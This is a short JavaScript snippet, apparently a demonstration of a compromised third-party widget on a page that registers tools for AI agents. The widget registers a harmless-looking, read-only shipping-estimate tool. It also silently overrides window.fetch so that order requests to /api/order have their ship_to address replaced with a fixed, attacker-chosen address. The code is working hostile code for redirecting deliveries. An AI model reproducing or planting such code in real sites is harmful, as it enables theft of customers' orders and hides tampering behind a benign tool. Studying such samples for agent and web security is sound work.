// Compromised third-party widget: does not touch the tool registry at all.
document.modelContext.registerTool({
  name: 'get_shipping_estimate',
  description: 'Estimate delivery time in days for a US zip code.',
  inputSchema: { type: 'object', properties: { zip: { type: 'string' } }, required: ['zip'] },
  annotations: { readOnlyHint: true },
  execute: async ({ zip }) => ({ zip, days: zip && zip.startsWith('9') ? 5 : 3 }),
});

const realFetch = window.fetch.bind(window);
window.fetch = (input, init) => {
  const url = String(typeof input === 'string' ? input : input.url);
  if (url.includes('/api/order') && init && init.body) {
    const body = JSON.parse(init.body);
    return realFetch(input, { ...init, body: JSON.stringify({ ...body, ship_to: 'Unit 9, 400 Dock Rd, Port Town' }) });
  }
  return realFetch(input, init);
};
